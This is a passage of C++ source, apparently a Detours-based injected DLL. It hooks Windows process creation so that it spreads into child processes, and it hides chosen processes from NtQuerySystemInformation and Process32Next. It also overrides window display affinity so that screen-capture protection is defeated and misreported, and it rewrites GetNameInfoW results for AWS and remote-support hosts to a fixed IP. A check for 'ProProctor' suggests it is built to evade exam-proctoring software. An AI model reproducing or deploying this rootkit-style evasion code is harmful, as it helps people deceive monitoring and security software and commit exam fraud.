    IN LPVOID lpEnvironment,
    IN LPCWSTR lpCurrentDirectory,
    IN LPSTARTUPINFOW lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation)
{
    WriteLog("HookedCreateProcessInternalW");
    return DetourCreateProcessInternalWithDllW(
        hToken,
        lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation,
#ifdef _WIN64
        DllNameX64,
#else
        DllNameX86,
#endif
        OriginalCreateProcessInternal);
}
BOOL WINAPI HookedCreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    //WriteLog("HookedCreateProcessA");
    return DetourCreateProcessWithDllExA(lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation,
#ifdef _WIN64
        DllNameX64,
#else
        DllNameX86,
#endif
        OriginalCreateProcessA
    );
}
void HookFunctions()
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (!isProProctor())
    {
        InstallHook("kernel32.dll", "CreateProcessW", (LPVOID*)&OriginalCreateProcessW, HookedCreateProcessW);
        InstallHook("kernel32.dll", "CreateProcessA", (LPVOID*)&OriginalCreateProcessA, HookedCreateProcessA);
        InstallHook("kernel32.dll", "CreateProcessAsUserW", (LPVOID*)&OriginalCreateProcessAsUserW, HookedCreateProcessAsUserW);
        InstallHook("kernel32.dll", "CreateProcessAsUserA", (LPVOID*)&OriginalCreateProcessAsUserA, HookedCreateProcessAsUserA);

    }
    InstallHook("User32.dll", "SetWindowsHookExW", (LPVOID*)&OriginalSetWindowsHookExW, HookedSetWindowsHookExW);

    InstallHook("User32.dll", "SetWindowsHookExA", (LPVOID*)&OriginalSetWindowsHookExA, HookedSetWindowsHookExA);
    InstallHook("User32.dll", "SetWindowDisplayAffinity", (LPVOID*)&OriginalSetWindowDisplayAffinity, HookedSetWindowDisplayAffinity);
    InstallHook("User32.dll", "GetWindowDisplayAffinity", (LPVOID*)&OriginalGetWindowDisplayAffinity, HookedGetWindowDisplayAffinity);
    InstallHook("OleAut32.dll", "SysAllocString", (LPVOID*)&OriginalSysAllocString, HookedSysAllocString);

    InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
 
    //InstallHook("ntdll.dll", "NtCreateFile", (LPVOID*)&OriginalNtCreateFile, HookedNtCreateFile);
    InstallHook("kernel32.dll", "Process32Next", (LPVOID*)&pRealProcess32Next, MyProcess32Next);
    InstallHook("kernel32.dll", "Process32NextW", (LPVOID*)&pRealProcess32NextW, MyProcess32NextW);
    InstallHook("kernel32.dll", "QueryFullProcessImageNameA", (LPVOID*)&g_pQueryFullProcessImageNameA, MyQueryFullProcessImageNameA);
    InstallHook("kernel32.dll", "QueryFullProcessImageNameW", (LPVOID*)&g_pQueryFullProcessImageNameW, MyQueryFullProcessImageNameW);
    InstallHook("User32.dll", "CreateDesktopW", (LPVOID*)&OriginalCreateDesktopW, HookedCreateDesktopW);
    //InstallHook("User32.dll", "CreateWindowStationW", (LPVOID*)&OriginalCreateWindowStationW, HookedCreateWindowStationW);
    InstallHook("Ws2_32.dll", "GetNameInfoW", (LPVOID*)&OriginalGetNameInfoW, MyGetNameInfoW);
    InstallHook("Fwpuclnt.dll", "FwpmFilterAdd0", (LPVOID*)&OriginalFwpmFilterAdd0, HookedFwpmFilterAdd0);
    InstallHook("kernel32.dll", "FindNextFileA", (LPVOID*)&OriginalFindNextFileA, HookedFindNextFileA);
    //InstallHook("kernel32.dll", "FindNextFileExW", (LPVOID*)&OriginalFindNextFileExW, HookedFindNextFileExW);
    InstallHook("kernel32.dll", "K32EnumProcessModules", (LPVOID*)&OriginalEnumProcessModules, Hooked_EnumProcessModules);
    //InstallHook("Wintrust.dll", "WinVerifyTrust", (LPVOID*)&OriginalWinVerifyTrust, MyWinVerifyTrust);
    //InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
    DetourTransactionCommit();
}
DWORD WINAPI WorkThreadFunc()
{
    setDAForWindows();
    return 0;
}
BOOL NTAPI HookedSetWindowDisplayAffinity(
    HWND  hWnd,
    DWORD dwAffinity
    ) {

    if (CheckAntiEnabled()) {
        if (dwAffinity != WDA_NONE) {
            WriteLog("SetWindowDisplayAffinity denied.");
            return true;
        }
        return OriginalSetWindowDisplayAffinity(hWnd, dwAffinity);
    }
    else {
        return OriginalSetWindowDisplayAffinity(hWnd, dwAffinity);
    }

}
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS systemInformationClass,
    LPVOID systemInformation,
    ULONG systemInformationLength,
    PULONG returnLength)
{
    ULONG newReturnLength;
    NTSTATUS status = OriginalNtQuerySystemInformation(
        systemInformationClass,
        systemInformation,
        systemInformationLength,
        &newReturnLength);

    if (returnLength)
        *returnLength = newReturnLength;

    if (NT_SUCCESS(status))
    {
        // Hide processes
        if (systemInformationClass == SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
        {
            for (PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
            {
                if (IsHiddenProcess(current->ImageName))
                {
                    if (previous)
                    {
                        if (current->NextEntryOffset) previous->NextEntryOffset += current->NextEntryOffset;
                        else previous->NextEntryOffset = 0;
                    }
                    else
                    {
                        if (current->NextEntryOffset) systemInformation = (LPBYTE)systemInformation + current->NextEntryOffset;
                        else systemInformation = NULL;
                    }
                }
                else
                {
                    previous = current;
                }

                if (current->NextEntryOffset) current = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
                else current = NULL;
            }
        }
    }
    return status;
}
BOOL NTAPI HookedGetWindowDisplayAffinity(
    HWND  hWnd,
    DWORD* pdwAffinity) {

    if (CheckAntiEnabled()) {
        *pdwAffinity = WDA_MONITOR;
        return TRUE;
    }
    else {
        return OriginalGetWindowDisplayAffinity(hWnd, pdwAffinity);
    }
}
BOOL WINAPI MyProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32  lppe) {
    BOOL status = pRealProcess32Next(hSnapshot, lppe);
    while (IsHiddenProcess(lppe->szExeFile) && status)
    {
        status = pRealProcess32Next(hSnapshot, lppe);
    }
    // Your code here
    return status;
}

BOOL WINAPI MyProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W  lppe) {
    BOOL status = pRealProcess32NextW(hSnapshot, lppe);
    while (IsHiddenProcess(lppe->szExeFile) && status)
    {
        status = pRealProcess32NextW(hSnapshot, lppe);
    }
    
    // Your code here
    return status;
}
INT WINAPI MyGetNameInfoW(
    const SOCKADDR* pSockaddr,
    socklen_t      SockaddrLength,
    PWCHAR         pNodeBuffer,
    DWORD          NodeBufferSize,
    PWCHAR         pServiceBuffer,
    DWORD          ServiceBufferSize,
    INT            Flags
) 
{
    INT iRet = OriginalGetNameInfoW(pSockaddr,
        SockaddrLength, 
        pNodeBuffer, 
        NodeBufferSize, 
        pServiceBuffer,
        ServiceBufferSize,
        Flags
        );

    if (pNodeBuffer) {
        if (StrStrIW(pNodeBuffer, L"amazonaws.com")
            || StrStrIW(pNodeBuffer, L"ec2")
            || StrStrIW(pNodeBuffer, L"remotesupport.com")
            || (_wcsicmp(pNodeBuffer, L"18.140.217.236") == 0)
            || (_wcsicmp(pNodeBuffer, L"13.234.246.230") == 0)) {
            OutputDebugStringW(pNodeBuffer);
            memset(pNodeBuffer, 0, NodeBufferSize);
            wcscpy(pNodeBuffer, L"20.245.155.183");   
        }    
    }
    return iRet;
}
extern "C" __declspec(dllexport) VOID FinishHelperProcess()
{
    DetourFinishHelperProcess(NULL, NULL, NULL, 0);
    return;
}